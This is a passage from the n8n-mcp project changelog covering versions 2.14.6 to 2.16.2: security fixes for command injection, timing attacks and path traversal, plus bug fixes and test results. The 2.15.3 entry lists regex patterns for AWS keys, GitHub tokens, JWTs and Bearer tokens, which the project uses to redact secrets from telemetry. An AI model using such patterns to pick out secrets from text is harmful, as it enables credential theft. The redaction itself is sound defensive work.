const files = await fs.readdir(searchPath, { recursive: true });
const match = files.find(f => f.endsWith(`${safeName}.md`) && !f.includes('credentials'));
```

### Breaking Changes

**None** - All changes are backward compatible. No API changes, no environment variable changes, no database migrations.

### Migration Guide

**No action required** - This is a drop-in security fix. Simply upgrade:

```bash
npm install n8n-mcp@2.16.2
# or
npm update n8n-mcp
```

### Deployment Notes

**Recommended Actions:**
1. ✅ **Upgrade immediately** - These are critical security fixes
2. ✅ **Review logs** - Check for any suspicious authentication attempts or unusual nodeType parameters
3. ✅ **Rotate tokens** - Consider rotating AUTH_TOKEN after upgrade (optional but recommended)

**No configuration changes needed** - The fixes are transparent to existing deployments.

### Test Results

**All Tests Passing:**
- Unit tests: 11/11 ✅ (timing-safe comparison)
- Integration tests: 9/9 ✅ (command injection prevention)
- Timing variance: <10% ✅ (proves constant-time)
- All existing tests: ✅ (no regressions)

**Security Verification:**
- ✅ No command execution with malicious inputs
- ✅ Timing attack variance <10% (statistical analysis over 1000 samples)
- ✅ Directory traversal blocked (parent dir, absolute paths, URL-encoded)
- ✅ All special characters sanitized safely

### Audit Trail

**Security Audit:** Issue #265 - Third-party security audit identified 25 issues
**This Release:** Fixes 2 CRITICAL issues (CRITICAL-01, CRITICAL-02)
**Remaining Work:** 20 issues to be addressed in subsequent releases (HIGH, MEDIUM, LOW priority)

### References

- Security Audit: https://github.com/czlonkowski/n8n-mcp/issues/265
- Implementation Plan: `docs/local/security-implementation-plan-issue-265.md`
- Audit Analysis: `docs/local/security-audit-analysis-issue-265.md`

---

## [2.16.1] - 2025-10-06

### Fixed

- **🐛 Issue #277: Missing Signal Handlers in stdio Mode**
  - **Problem**: Node.js processes remained orphaned when Claude Desktop quit
  - **Platform**: Primarily affects Windows 11, but improves reliability on all platforms
  - **Root Cause**: stdio mode never registered SIGTERM/SIGINT signal handlers
  - **Impact**: Users had to manually kill processes via Task Manager after quitting Claude Desktop
  - **Fix**: Added comprehensive graceful shutdown handlers for stdio mode
    - SIGTERM, SIGINT, and SIGHUP signal handlers
    - stdin end/close event handlers (PRIMARY shutdown mechanism for Claude Desktop)
    - Robust container detection: Checks IS_DOCKER/IS_CONTAINER env vars + filesystem markers
    - Supports Docker, Kubernetes, Podman, and other container runtimes
    - Container mode: Signal handlers only (prevents detached mode premature shutdown)
    - Claude Desktop mode: stdin + signal handlers (comprehensive coverage)
    - Race condition protection with `isShuttingDown` guard
    - stdin cleanup with null safety (pause + destroy)
    - Graceful shutdown timeout (1000ms) to allow cleanup to complete
    - Error handling with try-catch for stdin registration and shutdown
    - Shutdown trigger logging for debugging (SIGTERM vs stdin close)
    - Production-hardened based on comprehensive code review
  - **Location**: `src/mcp/index.ts:91-132`
  - **Resources Cleaned**: Cache timers and database connections properly closed via existing `shutdown()` method
  - **Code Review**: Approved with recommendations implemented
  - **Reporter**: @Eddy-Chahed

## [2.16.0] - 2025-10-06

### Added

- **🎉 Issue #272 Phase 1: Connection Operations UX Improvements**

  **New: `rewireConnection` Operation**
  - Intuitive operation for changing connection target from one node to another
  - Syntax: `{type: "rewireConnection", source: "Node", from: "OldTarget", to: "NewTarget"}`
  - Internally uses remove + add pattern but with clearer semantics
  - Supports smart parameters (branch, case) for multi-output nodes
  - Validates all nodes exist before making changes
  - 8 comprehensive unit tests covering all scenarios

  **New: Smart Parameters for Multi-Output Nodes**
  - **branch parameter for IF nodes**: Use `branch: "true"` or `branch: "false"` instead of `sourceIndex: 0/1`
  - **case parameter for Switch nodes**: Use `case: 0`, `case: 1`, etc. instead of `sourceIndex`
  - Semantic, intuitive syntax that matches node behavior
  - Explicit sourceIndex overrides smart parameters if both provided
  - Works with both `addConnection` and `rewireConnection` operations
  - 8 comprehensive unit tests + 11 integration tests against real n8n API

### Changed

- **⚠️ BREAKING: Removed `updateConnection` operation**
  - Operation removed completely (type definition, implementation, validation, tests)
  - Migration: Use `rewireConnection` or `removeConnection` + `addConnection` instead
  - Reason: Confusing operation that was error-prone and rarely needed
  - All tests updated (137 tests passing)

### Fixed

- **🐛 CRITICAL: Issue #275, #136 - TypeError in getNodeTypeAlternatives (57.4% of production errors)**
  - **Impact**: Eliminated 323 out of 563 production errors, helping 127 users (76.5% of affected users)
  - **Resolves Issue #136**: "Partial Workflow Updates fail with 'Cannot convert undefined or null to object'" - defensive type guards prevent these crashes
  - **Root Cause**: `getNodeTypeAlternatives()` called string methods without validating nodeType parameter
  - **Fix**: Added defense-in-depth protection:
    - **Layer 1**: Type guard in `getNodeTypeAlternatives()` returns empty array for invalid inputs
    - **Layer 2**: Enhanced `validateToolParamsBasic()` to catch empty strings
  - **Affected Tools**: `get_node_essentials` (208 errors → 0), `get_node_info` (115 errors → 0), `get_node_documentation` (17 errors → 0)
  - **Testing**: 21 comprehensive unit tests, verified with n8n-mcp-tester agent
  - **Commit**: f139d38

- **Critical Bug: Smart Parameter Implementation**
  - **Bug #1**: `branch` parameter initially mapped to `sourceOutput` instead of `sourceIndex`
  - **Impact**: IF node connections went to wrong output (expected `IF.main[0]`, got `IF.true`)
  - **Root Cause**: Misunderstood n8n's IF node connection structure
  - **Fix**: Changed to correctly map `branch="true"` → `sourceIndex=0`, `branch="false"` → `sourceIndex=1`
  - **Discovered by**: n8n-mcp-tester agent testing against real n8n API
  - **Commit**: a7bfa73

- **Critical Bug: Zod Schema Stripping Parameters**
  - **Bug #2**: `branch`, `case`, `from`, `to` parameters stripped by Zod validation
  - **Impact**: Parameters never reached diff engine, smart parameters silently failed
  - **Root Cause**: Parameters not defined in Zod schema in handlers-workflow-diff.ts
  - **Fix**: Added missing parameters to schema
  - **Discovered by**: n8n-mcp-tester agent
  - **Commit**: aeaba3b

- **🔥 CRITICAL Bug: Array Index Corruption in Multi-Output Nodes**
  - **Bug #3**: `applyRemoveConnection()` filtered empty arrays, causing index shifting in multi-output nodes
  - **Impact**: PRODUCTION-BREAKING for Switch, IF with multiple handlers, Merge nodes
  - **Severity**: Connections routed to wrong outputs after rewiring
  - **Example**: Switch with 4 outputs `[[H0], [H1], [H2], [H3]]` → remove H1 → `[[H0], [H2], [H3]]` (indices shifted!)
  - **Root Cause**: Line 697 filtered empty arrays: `connections.filter(conns => conns.length > 0)`
  - **Fix**: Only remove trailing empty arrays, preserve intermediate ones to maintain index integrity
  - **Code Change**:
    ```typescript
    // Before (BUGGY):
    workflow.connections[node][output] = connections.filter(conns => conns.length > 0);

    // After (FIXED):
    while (connections.length > 0 && connections[connections.length - 1].length === 0) {
      connections.pop();
    }
    ```
  - **Testing**: Added integration test verifying Switch node rewiring preserves all indices
  - **Discovered by**: n8n-mcp-tester agent during comprehensive testing
  - **Commit**: aeb7410

- **TypeScript Compilation**: Added missing type annotations in workflow diff tests (Commit: 653f395)

### Improved

- **Integration Testing**: Created comprehensive integration tests against real n8n API
  - 11 tests covering IF nodes, Switch nodes, and rewireConnection
  - Tests validate actual n8n workflow structure, not in-memory objects
  - Would have caught both smart parameter bugs that unit tests missed
  - File: `tests/integration/n8n-api/workflows/smart-parameters.test.ts`
  - **Commit**: 34bafe2

- **Documentation**: Updated MCP tool documentation
  - Removed `updateConnection` references
  - Added `rewireConnection` with 4 examples
  - Added smart parameters section with IF and Switch examples
  - Updated best practices and pitfalls
  - Removed version references (AI agents see current state)
  - Files: `src/mcp/tool-docs/workflow_management/n8n-update-partial-workflow.ts`, `docs/workflow-diff-examples.md`
  - **Commit**: f78f53e

### Test Coverage

- **Total Tests**: 178 tests passing (158 unit + 20 integration against real n8n API)
- **Coverage**: 90.98% statements, 89.86% branches, 93.02% functions
- **Quality**: Integration tests against real n8n API prevent regression
- **New Tests**:
  - 21 tests for TypeError prevention (Issue #275)
  - 8 tests for rewireConnection operation
  - 8 tests for smart parameters
  - 20 integration tests against real n8n API:
    - **Multi-output nodes (sourceIndex preservation)**:
      - Switch node rewiring with index preservation
      - IF node empty array preservation on removal
      - Switch node removing first case (production-breaking bug scenario)
      - Sequential operations on Switch node
      - Filter node connection rewiring
    - **Multi-input nodes (targetIndex preservation)**:
      - Merge node removing connection to input 0
      - Merge node removing middle connection (inputs 0, 2 preserved)
      - Merge node replacing source connections
      - Merge node sequential operations

### Technical Details

**TypeError Prevention (Issue #275):**
```typescript
// Layer 1: Defensive utility function
export function getNodeTypeAlternatives(nodeType: string): string[] {
  // Return empty array for invalid inputs instead of crashing
  if (!nodeType || typeof nodeType !== 'string' || nodeType.trim() === '') {
    return [];
  }
  // ... rest of function
}

// Layer 2: Enhanced validation
if (param === '') {
  errors.push(`String parameters cannot be empty. Parameter '${key}' has value: ""`);
}
```

**Smart Parameters Resolution:**
```typescript
// Resolve branch parameter for IF nodes
if (operation.branch !== undefined && operation.sourceIndex === undefined) {
  if (sourceNode?.type === 'n8n-nodes-base.if') {
    sourceIndex = operation.branch === 'true' ? 0 : 1;
    // sourceOutput remains 'main'
  }
}

// Resolve case parameter for Switch nodes
if (operation.case !== undefined && operation.sourceIndex === undefined) {
  sourceIndex = operation.case;
}
```

**Real n8n IF Node Structure:**
```json
"IF": {
  "main": [
    [/* true branch connections, index 0 */],
    [/* false branch connections, index 1 */]
  ]
}
```

### Migration Guide

**Before (v2.15.7):**
```typescript
// Old way: updateConnection (REMOVED)
{type: "updateConnection", source: "Webhook", target: "Handler", updates: {...}}

// Old way: Multi-output nodes (still works)
{type: "addConnection", source: "IF", target: "Success", sourceIndex: 0}
```

**After (v2.16.0):**
```typescript
// New way: rewireConnection
{type: "rewireConnection", source: "Webhook", from: "OldHandler", to: "NewHandler"}

// New way: Smart parameters (recommended)
{type: "addConnection", source: "IF", target: "Success", branch: "true"}
{type: "addConnection", source: "IF", target: "Error", branch: "false"}
{type: "addConnection", source: "Switch", target: "Handler", case: 0}
```

### Impact Summary

**Production Error Reduction:**
- Issue #275 fix: -323 errors (-57.4% of total production errors)
- Helps 127 users (76.5% of users experiencing errors)

**UX Improvements:**
- Semantic parameters make multi-output node connections intuitive
- `rewireConnection` provides clear intent for connection changes
- Integration tests ensure production reliability

**Breaking Changes:**
- `updateConnection` removed (use `rewireConnection` or manual remove+add)

### References

- **Issue #272**: Connection operations improvements (Phase 0 + Phase 1)
- **Issue #204**: Differential update failures on Windows
- **Issue #275**: TypeError in getNodeTypeAlternatives
- **Issue #136**: Partial Workflow Updates fail with "Cannot convert undefined or null to object" (resolved by defensive type guards)
- **Commits**:
  - Phase 0: cfe3c5e, 653f395, 2a85000
  - Phase 1: f9194ee, ee125c5, a7bfa73, aeaba3b, 34bafe2, c6e0e52, f78f53e
  - Issue #275/#136: f139d38

## [2.15.7] - 2025-10-05

### Fixed

- **🐛 CRITICAL: Issue #272, #204 - Connection Operations Phase 0 Fixes**

  **Bug #1: Multi-Output Node Routing Broken**
  - **Problem**: `addConnection` ignored `sourceIndex` parameter due to `||` operator treating `0` as falsy
  - **Impact**: IF nodes, Switch nodes, and all conditional routing completely broken
  - **Root Cause**: Used `operation.sourceIndex || 0` instead of `operation.sourceIndex ?? 0`
  - **Fix**: Changed to nullish coalescing (`??`) operator to properly handle explicit `0` values
  - **Added**: Defensive array validation before index access
  - **Result**: Multi-output nodes now work reliably (rating improved 3/10 → 9/10)
  - **Test Coverage**: 6 comprehensive tests covering IF nodes, Switch nodes, and parallel execution

  **Bug #2: Server Crashes from Missing `updates` Object**
  - **Problem**: `updateConnection` without `updates` object caused server crash with "Cannot read properties of undefined"
  - **Impact**: Malformed requests from AI agents crashed the MCP server
  - **Fix**: Added runtime validation with comprehensive error message
  - **Error Message Quality**:
    - Shows what was provided (JSON.stringify of operation)
    - Explains what's wrong and why
    - Provides correct format with example
    - Suggests alternative approach (removeConnection + addConnection)
  - **Result**: No crashes, self-service troubleshooting enabled (rating improved 2/10 → 8/10)
  - **Test Coverage**: 2 tests for missing and invalid `updates` object

### Improved

- **Connection Operations Overall Experience**: 4.5/10 → 8.5/10 (+89% improvement)
- **Error Handling**: Helpful, actionable error messages instead of cryptic crashes
- **Documentation**: Updated tool docs with Phase 0 fix notes and new pitfall warnings
- **Developer Experience**: Better use of nullish coalescing, defensive programming patterns

### Test Coverage

- Total Tests: 126/126 passing (100%)
- New Tests: 8 comprehensive tests for Phase 0 fixes
- Coverage: 91.16% statements, 88.14% branches, 92.85% functions
- Test Quality: All edge cases covered, strong assertions, independent test isolation

### Technical Details

**Multi-Output Node Fix:**
```typescript
// Before (BROKEN):
const sourceIndex = operation.sourceIndex || 0;  // 0 treated as falsy!

// After (FIXED):
const sourceIndex = operation.sourceIndex ?? 0;  // explicit 0 preserved
```

**Runtime Validation Fix:**
```typescript
// Added comprehensive validation:
if (!operation.updates || typeof operation.updates !== 'object') {
  throw new Error(/* helpful 15-line error message */);
}
```

### References

- Issue #272: Connection operations failing (Polish language issue report)
- Issue #204: Differential update failures on Windows
- Analysis Document: `docs/local/connection-operations-deep-dive-and-improvement-plan.md` (2176 lines)
- Testing: Hands-on validation with n8n-mcp-tester agent
- Code Review: Comprehensive review against improvement plan

### Phase 1 Roadmap

Phase 0 addressed critical bugs. Future Phase 1 improvements planned:
- Add `rewireConnection` operation for intuitive connection rewiring
- Add smart parameters (`branch` for IF nodes, `case` for Switch nodes)
- Enhanced error messages with spell-checking
- Deprecation path for `updateConnection`

## [2.15.6] - 2025-10-05

### Fixed
- **Issue #269: Missing addNode Examples** - Added comprehensive examples for addNode operation in MCP tool documentation
  - Problem: Claude AI didn't know how to use addNode operation correctly due to zero examples in documentation
  - Solution: Added 4 progressive examples to `n8n_update_partial_workflow` tool documentation:
    1. Basic addNode (minimal configuration)
    2. Complete addNode (full parameters including typeVersion)
    3. addNode + addConnection combo (most common pattern)
    4. Batch operation (multiple nodes + connections)
  - Impact: AI assistants can now correctly use addNode without errors or trial-and-error

- **Issue #270: Apostrophes in Node Names** - Fixed workflow diff operations failing when node names contain special characters
  - Root Cause: `findNode()` method used exact string matching without normalization, causing escaped vs unescaped character mismatches
  - Example: Default Manual Trigger node name "When clicking 'Execute workflow'" failed when JSON-RPC sent escaped version "When clicking \\'Execute workflow\\'"
  - Solution: Added `normalizeNodeName()` helper that unescapes special characters (quotes, backslashes) and normalizes whitespace
  - Affected Operations: 8 operations fixed - addConnection, removeConnection, updateConnection, removeNode, updateNode, moveNode, enableNode, disableNode
  - Error Messages: Enhanced all validation methods with `formatNodeNotFoundError()` helper showing available nodes and suggesting node IDs for special characters
  - Duplicate Prevention: Fixed `validateAddNode()` to use normalization when checking for duplicate node names

### Changed
- **WorkflowDiffEngine String Normalization** - Enhanced to handle edge cases from code review
  - Regex Processing Order: Fixed critical bug - now processes backslashes BEFORE quotes (prevents multiply-escaped character failures)
  - Whitespace Handling: Comprehensive normalization of tabs, newlines, and mixed whitespace (prevents collision edge cases)
  - Documentation: Added detailed JSDoc warnings about normalization collision risks with examples
  - Best Practice: Documentation recommends using node IDs over names for special characters

### Technical Details
- **Normalization Algorithm**: 4-step process
  1. Trim leading/trailing whitespace
  2. Unescape backslashes (MUST be first!)
  3. Unescape single and double quotes
  4. Normalize all whitespace to single spaces
- **Error Message Format**: Now shows node IDs (first 8 chars) and suggests using IDs for special characters
- **Collision Prevention**: Duplicate checking uses same normalization to prevent subtle bugs

### Test Coverage
- Unit tests: 120/120 passing (up from 116)
- New test scenarios:
  - Tabs in node names
  - Newlines in node names
  - Mixed whitespace (tabs + newlines + spaces)
  - Escaped vs unescaped matching (core Issue #270 scenario)
- Coverage: 90.11% statements (up from 90.05%)

### Code Review
- All 6 MUST FIX and SHOULD FIX recommendations implemented:
  - ✅ Fixed regex processing order (critical bug)
  - ✅ Added comprehensive whitespace tests
  - ✅ Fixed duplicate checking normalization
  - ✅ Enhanced all 6 validation method error messages
  - ✅ Added comprehensive JSDoc documentation
  - ✅ Added escaped vs unescaped test case
- Final review: APPROVED FOR MERGE (production-ready)

### Impact
- **Workflow Operations**: All 8 affected operations now handle special characters correctly
- **User Experience**: Clear error messages with actionable suggestions
- **Reliability**: Comprehensive normalization prevents subtle bugs
- **Documentation**: Tool documentation updated to reflect fix (v2.15.6+)

## [2.15.5] - 2025-10-04

### Added
- **Phase 5 Integration Tests** - Comprehensive workflow management tests (16 scenarios)
  - `delete-workflow.test.ts`: 3 test scenarios
    - Successful deletion
    - Error handling for non-existent workflows
    - Cleanup verification (workflow actually deleted from n8n)
  - `list-workflows.test.ts`: 13 test scenarios
    - No filters (all workflows)
    - Filter by active status (true/false)
    - Pagination (first page, cursor, last page)
    - Limit variations (1, 50, 100)
    - Exclude pinned data
    - Empty results handling
    - Sort order consistency verification

### Fixed
- **handleDeleteWorkflow** - Now returns deleted workflow data in response
  - Before: Returned only success message
  - After: Returns deleted workflow object per n8n API specification
  - Impact: MCP tool consumers can access deleted workflow data for confirmation, logging, or undo operations

- **handleListWorkflows Tags Filter** - Fixed tags parameter format for n8n API compliance
  - Before: Sent tags as array `?tags[]=tag1&tags[]=tag2` (non-functional)
  - After: Converts to comma-separated string `?tags=tag1,tag2` per n8n OpenAPI spec
  - Impact: Tags filtering now works correctly when listing workflows
  - Implementation: `input.tags.join(',')` conversion in handler

- **N8nApiClient.deleteWorkflow** - Return type now matches n8n API specification
  - Before: `Promise<void>`
  - After: `Promise<Workflow>` (returns deleted workflow object)
  - Impact: Aligns with n8n API behavior where DELETE returns the deleted resource

### Changed
- **WorkflowListParams.tags** - Type changed for API compliance
  - Before: `tags?: string[] | null` (incorrect)
  - After: `tags?: string | null` (comma-separated string per n8n OpenAPI spec)
  - Impact: Type safety now matches actual API behavior

### Technical Details
- **API Compliance**: All fixes align with n8n OpenAPI specification
- **Backward Compatibility**: Handler maintains existing MCP tool interface (array input converted internally)
- **Type Safety**: TypeScript types now accurately reflect n8n API contracts

### Test Coverage
- Integration tests: 71/71 passing (Phase 1-5 complete)
- Total test scenarios across all phases: 87
- New coverage:
  - Workflow deletion: 3 scenarios
  - Workflow listing with filters: 13 scenarios

### Impact
- **DELETE workflows**: Now returns workflow data for verification
- **List with tags**: Tag filtering now functional (was broken before)
- **API alignment**: Implementation correctly matches n8n OpenAPI specification
- **Test reliability**: All integration tests passing in CI

## [2.15.4] - 2025-10-04

### Fixed
- **Workflow Settings Updates** - Enhanced `cleanWorkflowForUpdate` to enable settings updates while maintaining Issue #248 protection
  - Changed from always overwriting settings with `{}` to filtering to whitelisted properties
  - Filters settings to OpenAPI spec whitelisted properties: `saveExecutionProgress`, `saveManualExecutions`, `saveDataErrorExecution`, `saveDataSuccessExecution`, `executionTimeout`, `errorWorkflow`, `timezone`, `executionOrder`
  - Removes unsafe properties like `callerPolicy` that cause "additional properties" API errors
  - Maintains backward compatibility: empty object `{}` still used when no settings provided
  - Resolves conflict between preventing Issue #248 errors and enabling legitimate settings updates

- **Phase 4 Integration Tests** - Fixed workflow update tests to comply with n8n API requirements
  - Updated all `handleUpdateWorkflow` tests to include required fields: `name`, `nodes`, `connections`, `settings`
  - Tests now fetch current workflow state before updates to obtain required fields
  - Removed invalid "Update Connections" test that attempted to set empty connections on multi-node workflow (architecturally invalid)
  - All 42 workflow update test scenarios now passing

### Changed
- **Settings Filtering Strategy** - Updated `cleanWorkflowForUpdate()` implementation
  - Before: Always set `settings = {}` (prevented all settings updates)
  - After: Filter to whitelisted properties (allows valid updates, blocks problematic ones)
  - Impact: Users can now update workflow settings via API while staying protected from validation errors

### Technical Details
- **Whitelist-based Filtering**: Implements principle of least privilege for settings properties
- **Reference**: Properties validated against n8n OpenAPI specification `workflowSettings` schema
- **Security**: More secure than blacklist approach (fails safe, unknown properties filtered)
- **Performance**: Filtering adds <1ms overhead per workflow update

### Test Coverage
- Unit tests: 72/72 passing (100% coverage for n8n-validation)
- Integration tests: 433/433 passing (Phase 4 complete)
- Test scenarios:
  - Settings filtering with safe/unsafe property combinations
  - Empty settings handling
  - Backward compatibility verification
  - Multi-node workflow connection validation

### Impact
- **Settings Updates**: Users can now update workflow settings (timezone, executionOrder, etc.) via API
- **Issue #248 Protection Maintained**: `callerPolicy` and other problematic properties still filtered
- **Test Reliability**: All Phase 4 integration tests passing in CI
- **API Compliance**: Tests correctly implement n8n API requirements for workflow updates

## [2.15.3] - 2025-10-03

### Added
- **Error Message Capture in Telemetry** - Enhanced telemetry tracking to capture actual error messages for better debugging
  - Added optional `errorMessage` parameter to `trackError()` method
  - Comprehensive error message sanitization to protect sensitive data
  - Updated all production and test call sites to pass error messages
  - Error messages now stored in telemetry events table for analysis

### Security
- **Enhanced Error Message Sanitization** - Comprehensive security hardening for telemetry data
  - **ReDoS Prevention**: Early truncation to 1500 chars before regex processing
  - **Full URL Redaction**: Changed from `[URL]/path` to `[URL]` to prevent API structure leakage
  - **Correct Sanitization Order**: URLs → specific credentials → emails → generic patterns
  - **Credential Pattern Detection**: Added AWS keys, GitHub tokens, JWT, Bearer tokens
  - **Error Handling**: Try-catch wrapper with `[SANITIZATION_FAILED]` fallback
  - **Stack Trace Truncation**: Limited to first 3 lines to reduce attack surface

### Fixed
- **Missing Error Messages**: Resolved issue where 272+ weekly validation errors had no error messages captured
- **Data Leakage**: Fixed URL path preservation exposing API versions and user IDs
- **Email Exposure**: Fixed sanitization order allowing emails in URLs to leak
- **ReDoS Vulnerability**: Removed complex capturing regex patterns that could cause performance issues

### Changed
- **Breaking Change**: `trackError()` signature updated with 4th parameter `errorMessage?: string`
  - All internal call sites updated in single commit (atomic change)
  - Not backwards compatible but acceptable as all code is internal

### Technical Details
- **Sanitization Patterns**:
  - AWS Keys: `AKIA[A-Z0-9]{16}` → `[AWS_KEY]`
  - GitHub Tokens: `ghp_[a-zA-Z0-9]{36,}` → `[GITHUB_TOKEN]`
  - JWT: `eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+` → `[JWT]`
  - Bearer Tokens: `Bearer [^\s]+` → `Bearer [TOKEN]`
  - Emails: `[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}` → `[EMAIL]`
  - Long Keys: `\b[a-zA-Z0-9_-]{32,}\b` → `[KEY]`
  - Generic Credentials: `password/api_key/token=<value>` → `<field>=[REDACTED]`

### Test Coverage
- Added 18 new security-focused tests
- Total telemetry tests: 269 passing
- Coverage: 90.75% for telemetry module
- All security patterns validated with edge cases

### Performance
- Early truncation prevents ReDoS attacks
- Simplified regex patterns (no complex capturing groups)
- Sanitization adds <1ms overhead per error
- Final message truncated to 500 chars max

### Impact
- **Debugging**: Error messages now available for root cause analysis
- **Security**: Comprehensive protection against credential leakage
- **Performance**: Protected against ReDoS attacks
- **Reliability**: Try-catch ensures sanitization never breaks telemetry

## [2.15.2] - 2025-10-03

### Fixed
- **Template Search Performance & Reliability** - Enhanced `search_templates_by_metadata` with production-ready improvements
  - **Ordering Stability**: Implemented CTE with VALUES clause to preserve exact Phase 1 ordering
    - Prevents ordering discrepancies between ID selection and data fetch phases
    - Ensures deterministic results across query phases
  - **Defensive ID Validation**: Added type safety filters before Phase 2 query
    - Validates only positive integers are used in the CTE
    - Logs warnings for filtered invalid IDs
  - **Performance Monitoring**: Added detailed timing metrics (phase1Ms, phase2Ms, totalMs)
    - Enables quantifying optimization benefits
    - Debug logging for all search operations
  - **DRY Refactoring**: Extracted `buildMetadataFilterConditions` helper method
    - Eliminates duplication between `searchTemplatesByMetadata` and `getMetadataSearchCount`
    - Centralized filter-building logic

### Added
- **Comprehensive Test Coverage** - 31 new unit tests achieving 100% coverage for changed code
  - `buildMetadataFilterConditions` - All filter combinations (11 tests)
  - Performance logging validation (3 tests)
  - ID filtering edge cases - negative, zero, non-integer, null (7 tests)
  - `getMetadataSearchCount` - Shared helper usage (7 tests)
  - Two-phase query optimization verification (3 tests)
- Fixed flaky integration tests with deterministic ordering using unique view counts

### Performance
- Query optimization maintains sub-1ms Phase 1 performance
- Two-phase approach prevents timeout on large template sets
- CTE-based ordering adds negligible overhead (<1ms)

### Test Results
- Unit tests: 31 new tests, all passing
- Integration tests: 36 passing, 1 skipped
- **Coverage**: 100% for changed code (previously 36.58% patch coverage)

## [2.15.0] - 2025-10-02

### 🚀 Major Features

#### P0-R3: Pre-extracted Template Configurations
- **Template-Based Configuration System** - 2,646 real-world node configurations from popular templates
  - Pre-extracted node configurations from all workflow templates
  - Ranked by template popularity (views)
  - Includes metadata: complexity, use cases, credentials, expressions
  - Query performance: <1ms (vs 30-60ms with previous system)
  - Database size increase: ~513 KB for 2,000+ configurations

### Breaking Changes

#### Removed: `get_node_for_task` Tool
- **Reason**: Only 31 hardcoded tasks, 28% failure rate in production
- **Replacement**: Template-based examples with 2,646 real configurations

#### Migration Guide

**Before (v2.14.7):**
```javascript
// Get configuration for a task
get_node_for_task({ task: "receive_webhook" })
```

**After (v2.15.0):**
```javascript
// Option 1: Search nodes with examples
search_nodes({
  query: "webhook",
  includeExamples: true
})
// Returns: Top 2 real template configs per node

// Option 2: Get node essentials with examples
get_node_essentials({
  nodeType: "nodes-base.webhook",
  includeExamples: true
})
// Returns: Top 3 real template configs with full metadata
```

### Added

- **Enhanced `search_nodes` Tool**
  - New parameter: `includeExamples` (boolean, default: false)
  - Returns top 2 real-world configurations per node from popular templates
  - Includes: configuration, template name, view count

- **Enhanced `get_node_essentials` Tool**
  - New parameter: `includeExamples` (boolean, default: false)
  - Returns top 3 real-world configurations with full metadata
  - Includes: configuration, source template, complexity, use cases, credentials info

- **Database Schema**
  - New table: `template_node_configs` - Pre-extracted node configurations
  - New view: `ranked_node_configs` - Easy access to top 5 configs per node
  - Optimized indexes for fast queries (<1ms)

- **Template Processing**
  - Automatic config extraction during `npm run fetch:templates`
  - Standalone extraction mode: `npm run fetch:templates:extract`
  - Expression detection ({{...}}, $json, $node)
  - Complexity analysis and use case extraction
  - Ranking by template popularity
  - Auto-creates `template_node_configs` table if missing

- **Comprehensive Test Suite**
  - 85+ tests covering all aspects of template configuration system
  - Integration tests for database operations and end-to-end workflows
  - Unit tests for tool parameters, extraction logic, and ranking algorithm
  - Fixtures for consistent test data across test suites
  - Test documentation in P0-R3-TEST-PLAN.md

### Removed

- Tool: `get_node_for_task` (see Breaking Changes above)
- Tool documentation: `get-node-for-task.ts`

### Fixed

- **`search_nodes` includeExamples Support**
  - Fixed `includeExamples` parameter not working due to missing FTS5 table
  - Added example support to `searchNodesLIKE` fallback method
  - Now returns template-based examples in all search scenarios
  - Affects 100% of search_nodes calls (database lacks nodes_fts table)

### Deprecated

- `TaskTemplates` service marked for removal in v2.16.0
- `list_tasks` tool marked for deprecation (use template search instead)

### Performance

- Query time: <1ms for pre-extracted configs (vs 30-60ms for on-demand generation)
- 30-60x faster configuration lookups
- 85x more configuration examples (2,646 vs 31)

## [2.14.7] - 2025-10-02

### Fixed
- **Issue #248: Settings Validation Error** - Fixed "settings must NOT have additional properties" API errors
  - Added `callerPolicy` property to `workflowSettingsSchema` to support valid n8n workflow setting
  - Implemented whitelist-based settings filtering in `cleanWorkflowForUpdate()` to prevent API errors
  - Filter removes UI-only properties (e.g., `timeSavedPerExecution`) that cause validation failures
  - Only whitelisted properties are sent to n8n API: `executionOrder`, `timezone`, `saveDataErrorExecution`, `saveDataSuccessExecution`, `saveManualExecutions`, `saveExecutionProgress`, `executionTimeout`, `errorWorkflow`, `callerPolicy`
  - Resolves workflow update failures caused by workflows fetched from n8n containing non-standard properties
  - Added 6 comprehensive unit tests covering settings filtering scenarios

- **Issue #249: Misleading AddConnection Error Messages** - Enhanced parameter validation with helpful error messages
  - Detect common parameter mistakes: using `sourceNodeId`/`targetNodeId` instead of correct `source`/`target`
  - Improved error messages include:
    - Identification of wrong parameter names with correction guidance
    - Examples of correct usage
    - List of available nodes when source/target not found
  - Error messages now actionable instead of cryptic (was: "Source node not found: undefined")
  - Added 8 comprehensive unit tests for parameter validation scenarios

- **P0-R1: Universal Node Type Normalization** - Eliminates 80% of validation errors
  - Implemented `NodeTypeNormalizer` utility for consistent node type handling
  - Automatically converts short forms to full forms (e.g., `nodes-base.webhook` → `n8n-nodes-base.webhook`)
  - Applied normalization across all workflow validation entry points
  - Updated workflow validator, handlers, and repository for universal normalization
  - Fixed test expectations to match normalized node type format
  - Resolves the single largest source of validation errors in production

### Added
- `NodeTypeNormalizer` utility class for universal node type normalization
  - `normalizeToFullForm()` - Convert any node type variation to canonical form
  - `normalizeWithDetails()` - Get normalization result with metadata
  - `normalizeWorkflowNodeTypes()` - Batch normalize all nodes in a workflow
- Settings whitelist filtering in `cleanWorkflowForUpdate()` with comprehensive null-safety
- Enhanced `validateAddConnection()` with proactive parameter validation
- 14 new unit tests for issues #248 and #249 fixes

### Changed
- Node repository now uses `NodeTypeNormalizer` for all lookups
- Workflow validation applies normalization before structure checks
- Workflow diff engine validates connection parameters before processing
- Settings filtering applied to all workflow update operations

### Performance
- No performance impact - normalization adds <1ms overhead per workflow
- Settings filtering is O(9) - negligible impact

### Test Coverage
- n8n-validation tests: 73/73 passing (100% coverage)
- workflow-diff-engine tests: 110/110 passing (89.72% coverage)
- Total: 183 tests passing

### Impact
- **Issue #248**: Eliminates ALL settings validation errors for workflows with non-standard properties
- **Issue #249**: Provides clear, actionable error messages reducing user frustration
- **P0-R1**: Reduces validation error rate by 80% (addresses 4,800+ weekly errors)
- Combined impact: Expected overall error rate reduction from 5-10% to <2%

## [2.14.6] - 2025-10-01

### Enhanced
- **Webhook Error Messages**: Replaced generic "Please try again later or contact support" messages with actionable guidance
  - Error messages now extract execution ID and workflow ID from failed webhook triggers
  - Guide users to use `n8n_get_execution({id: executionId, mode: 'preview'})` for efficient debugging
  - Format: "Workflow {workflowId} execution {executionId} failed. Use n8n_get_execution({id: '{executionId}', mode: 'preview'}) to investigate the error."
  - When no execution ID available: "Workflow failed to execute. Use n8n_list_executions to find recent executions, then n8n_get_execution with mode='preview' to investigate."

### Added
